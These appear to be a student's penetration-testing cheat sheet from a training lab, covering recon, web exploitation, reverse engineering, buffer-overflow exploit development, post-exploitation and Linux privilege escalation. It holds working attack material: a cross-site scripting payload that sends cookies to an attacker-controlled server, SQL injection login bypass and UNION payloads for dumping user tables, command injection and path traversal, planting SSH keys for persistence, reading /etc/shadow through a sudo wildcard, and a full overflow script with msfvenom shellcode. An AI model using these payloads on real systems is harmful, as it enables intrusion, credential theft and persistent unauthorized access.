#### Recon
* Ping Sweep
* Navigate any webpage you see
* `cat /etc/hosts`
* `sudo -l`
* Enumerating world writeable directories
* Check for SUID/SGID binaries on the system
* `ps -elf`
* `ip a`
* `ss -ntlp`
* `cat /etc/*release`
* `cat /var/spool/cron/crontab`
* `cat /etc/crontab`
* `id`
* `whoami`
#### Web Ex
* SQL Injection
  - `OR 1=1` to test which selection is vulnerable
  - Make the golden statement by `UNION SELECT 1,2,3` to figure out the order of the tables. Then print out the entirety of the tables.
* Directory Traversal
  - Files to search for
* Malicious File Upload
  - Do not upload files if you dont know what directory the files are going to
* Command Injection
  - `Whoami`
  - Semicolons before commands
#### Reverse Engineering
#### Exploit Dev
#### Post Ex
* Remote Logging
* `cat /etc/rsyslog.conf`
* Check for other security products
#### Win Exp
* Exe Replacement
* DLL Replacement
* Auditpol
#### Lin Exp







python3 -m http.server
<script>document.location="http://10.50.39.224:8000/"+document.cookie;</script>


## steps 
# to exploit a webpage: 
  nmap --script=http-enum <ip>
  after nmap you type in the directories found at the search bar (fefwwsfews/img or /admin)
  for the login, Aauth bypasss ('or1=1')  
	then inspect and go to network
	the click the request tab after clicking POST 
	copy past the raw request payload after a ? and possibly but easily collect creds

  generating your key
      ssh-keygen -t rsa -b 4096
      cat  /.ssh/id_rsa.pub
      echo "your key from the cat" > /var/www/.ssh/authorized_keys
        you may need to create the .ssh directory
            ; mkdir /var/www/.ssh
            
  then you replace the ssh keys with your own so you dont need a password to get on the box and make sure to create the authorized_keys file in www user with and using the echo command above will place your key in it allowing free ssh usage and no password
   
   # on a webpage in the search bar you need a ; before every command and if its not vulnerable to that try ../../../../../etc/passwd


## sql injections 
if brought to a webpage with multiple links or with catalogues use these
<thing>' OR 1='1’ 
identify columns with <vulnerable item>' UNION SELECT 1,2,3,4,5 #

<item>' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #
    allows to see tables, 2 and 5 are placeholders because we need a certain number of columns found via the 1=1  but because we only need 3 columns, we need 2 and 5 because the PAGE needs 5 columns

# use the GET method 
# In the search bar replace & with:
OR 1=1

# Identify vulnerable field (selection 2)
?Selection=3 UNION SELECT 1,2,3

# Identify number of columns (3, displayed in 1,3,2 order)
?Selection=3 UNION SELECT 1,2,3

# Golden Statement order displayed in 1,3,2
?Selection=3 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns

?Selection=3 UNION SELECT id,pass,name FROM session.user

' UNION SELECT table_schema,table_name FROM information_schema.columns
## example 
  http://127.0.0.1:12779/pick.php?product=7 UNION SELECT name,username,user_id FROM siteusers.users
  
## rev engineering 
run the exe or binary against strings with
    .\downloads\SYSINTERNALS\strings.exe .\downloads\.exe
then import to ghidra and analyze
then find the "success!" statement and work up and analyze what the code is doing 

## exploit developement
## for linux 
  *STEP 1 env - gdb ./.exe
  2. overload the file with a lot of characters 
  2a. once acquired the segmentation fault paste the EIP value in the buffer opverflow generator and use that as your buffer, 
  3. show env then unset env <variable except ourself  unsetlines and columns>
  4. run info proc map  AFTER A SEGMENTATION FAULT WHILST RUNNING  
  5. run find /b 0xf7de1000<start>, 0xffffe000<end>, 0xff, 0xe4
  6. tale first 4 (really 1) and convert it to little endian and make that your EIP
  7. use msfvenom to generate shellcode 
        msfvenom -p /linux/x86/exec CMD=<command to execute> -b '\x00' -f python
        msfvenom --list payloads (not important)
      ## how to generate shell code via msfconsole
payload/linux/x86/exec
show options 
set cmd whoami
    then show options to verify

## your script to get the code to work should be this (shell code is buf and is variable)
!/usr/bin/env python 
   
buffer = "A" * 62
eip = "\x59\x3b\xde\xf7"   first endian from info proc map (our linops)
nop = "\x90" * 15    nop sled
buf =  b""
buf += b"\xbb\x35\x5d\x8c\xf4\xd9\xed\xd9\x74\x24\xf4\x5a"
buf += b"\x2b\xc9\xb1\x0b\x31\x5a\x14\x83\xea\xfc\x03\x5a"
buf += b"\x10\xd7\xa8\xe6\xff\x4f\xca\xa5\x99\x07\xc1\x2a"      shellcode 
buf += b"\xef\x30\x71\x82\x9c\xd6\x82\xb4\x4d\x44\xea\x2a"
buf += b"\x1b\x6b\xbe\x5a\x1c\x6b\x3f\x9b\x54\x03\x50\xfa"
buf += b"\xf7\xba\xae\xab\x54\xb5\x4e\x9e\xdb"
print(buffer+eip+nop+buf)
    
8.  ## run <<< $(./buffer.py)            runs the file loaded with the file command and runs it with thescript 
## Starting program: /home/student/SECURITY/inventory.exe <<< $(./buffer.py) (how its running)

when you see a strcopy string its vulnerable to overflow
netstat -anob
task manager > performance > open resource monitor to see what port and processes run 
use: nc <your ip> <port opened by 

# windows exploit dev


## post exploitation 
scp -P 2323 <file> creds@127.0.0.1:/destination/location   # puts your file on a local machine to a remote system
scp -P 2323 creds@127.0.0.1:/remote/file.txt .    #grabs a file from a remote system

#### SSH Keys
* Bring private key to your own box
* On your box:
  - `chmod 600 /home/student/stolenkey` # place stolen key
  - `ssh -i /home/student/path/.ssh jane@1.2.3.4`   # use the key stored in home then regular ssh syntax, also change the directory perms to 700 for the one .ssh is in 
    
cat /etc/hosts
check /var/log/syslog
cat /etc/crontab
cat /etc/passwd and /shadow
enumerate user directories, check root, and any profile in home that can login as seen from  passwd

## privilege escalation 
for linux:
  sudo cat /etc/sudoers
cat /etc/rsyslog.conf  
cd to /etc/rsyslog.d then ls for newer references

sudo -l
    use gtfo bin to reference the commands that you cna exploit if any show up here

sudo -l 
  as root with NO PASSWD you can run /var/log/syslog* 
  ls -l /var/log/syslog* shows all the log rotations (.gz logs) 
    star means anything 
  so because star is there, it means any character o we can do: cat /var/log/syslog /etc/shadow (or any file)

if you cant run sudo -l or sudo in  general use the command  find / -type f -perm /4000 -ls 2>/dev/null
                                                                                or 2/6000 
 system level jobs are in /etc/crontab
 user level jobs are in /var/spool/cron/crontabs    #crontabs here typicaly is only accesed by root 

PATH=./:$PATH  makes the directory youre in a directory the system reads for commands, for example ls in that directory can be mkdir and can run a new set of commands when called in nthat directory
echo $PATH

find / -type d -perm /2 -ls 2>/dev/null # finds directories with the write permision set 
ls -lisa /tmp      ls -latr puts the most recently written to file at the bottom
wayss to figure out init type 
  ls -latr /proc/1/exe
  stat /sbin/init
  man init
  init --version
  ps -p 1

  sytemv is system 5
  
